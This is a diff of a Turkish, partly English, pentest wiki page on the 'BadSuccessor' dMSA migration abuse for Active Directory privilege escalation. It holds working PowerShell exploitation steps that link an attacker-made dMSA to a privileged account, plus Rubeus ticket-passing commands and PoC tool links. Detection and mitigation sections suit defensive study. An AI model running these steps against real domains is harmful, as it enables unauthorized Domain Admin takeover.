@@ -1,39 +1,39 @@
-# BadSuccessor: Delegeli MSA Göç İstismarı ile Yetki Yükseltme
+# BadSuccessor: Delegated MSA Migration Abuse ile Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Genel Bakış
 
-Delegeli Yönetilen Hizmet Hesapları (**dMSA**), Windows Server 2025'te sunulan **gMSA**'nın bir sonraki nesil halefidir. Meşru bir göç iş akışı, yöneticilerin *eski* bir hesabı (kullanıcı, bilgisayar veya hizmet hesabı) dMSA ile değiştirirken izinleri şeffaf bir şekilde korumasına olanak tanır. İş akışı, `Start-ADServiceAccountMigration` ve `Complete-ADServiceAccountMigration` gibi PowerShell cmdlet'leri aracılığıyla açığa çıkar ve **dMSA nesnesinin** iki LDAP niteliğine dayanır:
+Delegated Managed Service Accounts (**dMSA**), Windows Server 2025 ile sunulan **gMSA**'nın next-generation successor'ıdır. Meşru bir migration workflow'u, yöneticilerin bir *old* account'u (user, computer veya service account) izinleri şeffaf biçimde koruyarak bir dMSA ile değiştirmesine olanak tanır. Workflow, `Start-ADServiceAccountMigration` ve `Complete-ADServiceAccountMigration` gibi PowerShell cmdlet'leri aracılığıyla sunulur ve **dMSA object**'inin iki LDAP attribute'una dayanır:
 
-* **`msDS-ManagedAccountPrecededByLink`** – *DN bağlantısı* ile geçersiz kılınan (eski) hesap.
-* **`msDS-DelegatedMSAState`**       – göç durumu (`0` = yok, `1` = devam ediyor, `2` = *tamamlandı*).
+* **`msDS-ManagedAccountPrecededByLink`** – değiştirilen (old) account'a işaret eden *DN link*.
+* **`msDS-DelegatedMSAState`**       – migration state (`0` = none, `1` = in-progress, `2` = *completed*).<sup>[[1]](#references)</sup>
 
-Eğer bir saldırgan, bir OU içinde **herhangi bir** dMSA oluşturabilir ve bu 2 niteliği doğrudan manipüle edebilirse, LSASS ve KDC dMSA'yı bağlantılı hesabın *halef* olarak kabul eder. Saldırgan daha sonra dMSA olarak kimlik doğruladığında **bağlantılı hesabın tüm ayrıcalıklarını devralır** – eğer Yönetici hesabı bağlantılıysa **Domain Admin**'e kadar.
+Bir attacker bir OU içinde **herhangi** bir dMSA oluşturabilir ve bu 2 attribute'u doğrudan değiştirebilirse LSASS ve KDC, dMSA'yı link verilen account'un *successor*'ı olarak değerlendirir. Attacker daha sonra dMSA olarak authenticate olduğunda **linked account'un tüm privilege'larını devralır** – Administrator account'u link verilmişse **Domain Admin** seviyesine kadar.<sup>[[1]](#references)</sup>
 
-Bu teknik, 2025'te Unit 42 tarafından **BadSuccessor** olarak adlandırılmıştır. Yazma anında **hiçbir güvenlik yaması** mevcut değildir; yalnızca OU izinlerinin güçlendirilmesi sorunu hafifletir.
+Bu technique, 2025 yılında Unit 42 tarafından **BadSuccessor** olarak adlandırıldı. Yazım sırasında **hiçbir security patch** mevcut değildir; yalnızca OU permissions'larının hardening edilmesi bu issue'yu mitigation eder.<sup>[[1]](#references)[[2]](#references)</sup>
 
-### Saldırı Ön Koşulları
+### Attack prerequisites
 
-1. **Bir Organizasyonel Birim (OU)** içinde nesne oluşturmasına *izin verilen* bir hesap *ve* en az birine sahip olmalıdır:
-* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** nesne sınıfı
-* `Create Child` → **`All Objects`** (genel oluşturma)
-2. LDAP & Kerberos'a (standart alan katılmış senaryo / uzaktan saldırı) ağ bağlantısı.
+1. Bir OU içinde object oluşturmaya *izin verilen* ve aşağıdakilerden en az birine sahip olan bir account:
+* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
+* `Create Child` → **`All Objects`** (generic create)
+2. LDAP ve Kerberos'a network connectivity (standard domain joined senaryo / remote attack).<sup>[[1]](#references)</sup>
 
-## Savunmasız OUs'u Belirleme
+## Vulnerable OUs'ları Enumerating Etme
 
-Unit 42, her OU'nun güvenlik tanımlarını ayrıştıran ve gerekli ACE'leri vurgulayan bir PowerShell yardımcı betiği yayınladı:
+Unit 42, her OU'nun security descriptor'larını parse eden ve gerekli ACE'leri öne çıkaran bir PowerShell helper script yayınladı:<sup>[[1]](#references)</sup>
 ```powershell
 Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
 ```
-Arka planda, script `(objectClass=organizationalUnit)` için sayfalı bir LDAP araması yapar ve her `nTSecurityDescriptor`'ı kontrol eder.
+Arka planda script, `(objectClass=organizationalUnit)` için sayfalandırılmış bir LDAP araması gerçekleştirir ve her `nTSecurityDescriptor` için şunları kontrol eder:
 
 * `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
-* `Active Directory Şeması ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (nesne sınıfı *msDS-DelegatedManagedServiceAccount*)
+* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)
 
-## Sömürü Adımları
+## Exploitation Steps
 
-Yazılabilir bir OU belirlendikten sonra, saldırı sadece 3 LDAP yazım uzaklıktadır:
+Writable bir OU tanımlandığında saldırı yalnızca 3 LDAP yazma işlemi uzaktadır:<sup>[[1]](#references)</sup>
 ```powershell
 # 1. Create a new delegated MSA inside the delegated OU
 New-ADServiceAccount -Name attacker_dMSA \
@@ -47,15 +47,15 @@ Set-ADServiceAccount attacker_dMSA -Add \
 # 3. Mark the migration as *completed*
 Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
 ```
-Replike edildikten sonra, saldırgan basitçe `attacker_dMSA$` olarak **giriş yapabilir** veya bir Kerberos TGT talep edebilir – Windows, *geçersiz kılınmış* hesabın jetonunu oluşturacaktır.
+Replikasyondan sonra saldırgan basitçe `attacker_dMSA$` olarak **logon** olabilir veya bir Kerberos TGT isteyebilir – Windows, *superseded* hesabın token'ını oluşturur.<sup>[[1]](#references)</sup>
 
-### Otomasyon
+### Automation
 
-Bir dizi kamuya açık PoC, şifre alma ve bilet yönetimi dahil olmak üzere tüm iş akışını sarmaktadır:
+Birden fazla public PoC, password retrieval ve ticket management dahil olmak üzere tüm workflow'u kapsar:
 
-* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
-* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
-* NetExec modülü – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
+* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
+* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
+* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>
 
 ### Post-Exploitation
 ```powershell
@@ -66,26 +66,27 @@ Rubeus ptt /ticket:<Base64TGT>
 # Access Domain Admin resources
 dir \\DC01\C$
 ```
-## Tespit ve Avlanma
+## Tespit ve Hunting
 
-OU'larda **Nesne Denetimi**'ni etkinleştirin ve aşağıdaki Windows Güvenlik Olaylarını izleyin:
+OU'larda **Object Auditing** özelliğini etkinleştirin ve aşağıdaki Windows Security Events'lerini izleyin:<sup>[[1]](#references)[[2]](#references)</sup>
 
 * **5137** – **dMSA** nesnesinin oluşturulması
-* **5136** – **`msDS-ManagedAccountPrecededByLink`**'in değiştirilmesi
-* **4662** – Belirli nitelik değişiklikleri
+* **5136** – **`msDS-ManagedAccountPrecededByLink`** değişikliği
+* **4662** – Belirli attribute değişiklikleri
 * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
 * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
-* **2946** – dMSA için TGT verilmesi
+* **2946** – dMSA için TGT issuance
 
-`4662` (nitelik değişikliği), `4741` (bir bilgisayar/hizmet hesabının oluşturulması) ve `4624` (sonraki oturum açma) olaylarını ilişkilendirmek, BadSuccessor etkinliğini hızlı bir şekilde vurgular. **XSIAM** gibi XDR çözümleri, kullanıma hazır sorgularla birlikte gelir (bkz. referanslar).
+`4662` (attribute modification), `4741` (computer/service account oluşturulması) ve `4624` (sonraki logon) event'lerini ilişkilendirmek, BadSuccessor faaliyetlerini hızlıca ortaya çıkarır. **XSIAM** gibi XDR çözümleri kullanıma hazır query'lerle birlikte gelir (referanslara bakın).<sup>[[2]](#references)</sup>
 
-## Hafifletme
+## Önleme
 
-* **En az ayrıcalık** ilkesini uygulayın – yalnızca *Hizmet Hesabı* yönetimini güvenilir rollere devredin.
-* Açıkça gerekmeyen OU'lardan `Create Child` / `msDS-DelegatedManagedServiceAccount`'ı kaldırın.
-* Yukarıda listelenen olay kimliklerini izleyin ve dMSA oluşturan veya düzenleyen *non-Tier-0* kimlikleri konusunda uyarı verin.
+* **least privilege** ilkesini uygulayın – yalnızca **Service Account** yönetimini güvenilir rollere delegate edin.
+* Açıkça gerekli olmayan OU'lardan `Create Child` / `msDS-DelegatedManagedServiceAccount` izinlerini kaldırın.
+* Yukarıda listelenen event ID'lerini izleyin ve *non-Tier-0* identity'lerin dMSA oluşturması veya düzenlemesi durumunda alert oluşturun.
 
-## Ayrıca bakınız
+## Ayrıca bkz.
+
 
 {{#ref}}
 golden-dmsa-gmsa.md
@@ -93,9 +94,10 @@ golden-dmsa-gmsa.md
 
 ## Referanslar
 
-- [Unit42 – İyi Hesaplar Kötüye Gitti: Delegeli Yönetilen Hizmet Hesaplarını Sömürmek](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
-- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
-- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
-- [NetExec BadSuccessor modülü](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
+- [1] [BadSuccessor: Active Directory'de Privilege Escalation için dMSA Abuse – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
+- [2] [Unit42 – Good Accounts Go Bad: Delegated Managed Service Accounts Exploitation](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
+- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
+- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
+- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
 
 {{#include ../../banners/hacktricks-training.md}}
